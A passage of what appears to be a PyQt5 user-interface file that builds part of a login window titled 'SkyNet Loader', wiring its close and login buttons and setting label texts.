        self.bottom.setFrameShadow(QtWidgets.QFrame.Raised)
        self.bottom.setObjectName("bottom")
        self.verticalLayout_2 = QtWidgets.QVBoxLayout(self.bottom)
        self.verticalLayout_2.setObjectName("verticalLayout_2")
        self.label_credits = QtWidgets.QLabel(self.bottom)
        font = QtGui.QFont()
        font.setFamily("Segoe UI")
        self.label_credits.setFont(font)
        self.label_credits.setStyleSheet("color: rgb(75, 75, 75);")
        self.label_credits.setAlignment(QtCore.Qt.AlignRight|QtCore.Qt.AlignTrailing|QtCore.Qt.AlignVCenter)
        self.label_credits.setObjectName("label_credits")
        self.verticalLayout_2.addWidget(self.label_credits)
        self.verticalLayout.addWidget(self.bottom)
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 928, 21))
        self.menubar.setObjectName("menubar")
        MainWindow.setMenuBar(self.menubar)


        #
        # FUNCTIONS
        #

        # BT CLOSE POPUP
        self.pushButton_close_popup.clicked.connect(lambda: self.frame_error.hide())

        # HIDE ERROR
        self.frame_error.hide()

        # BT LOGIN
        self.pushButton_login.clicked.connect(self.checkFields)




        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "SkyNet Loader - Login"))
        self.label_error.setText(_translate("MainWindow", "Error"))
        self.lineEdit_user.setPlaceholderText(_translate("MainWindow", "USERNAME"))
        self.lineEdit_password.setPlaceholderText(_translate("MainWindow", "PASSWORD"))
        self.checkBox_save_user.setText(_translate("MainWindow", "Save User"))
        self.pushButton_login.setText(_translate("MainWindow", "Load Program"))
        self.label_credits.setText(_translate("MainWindow", "Created by: SKYNET"))

if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())
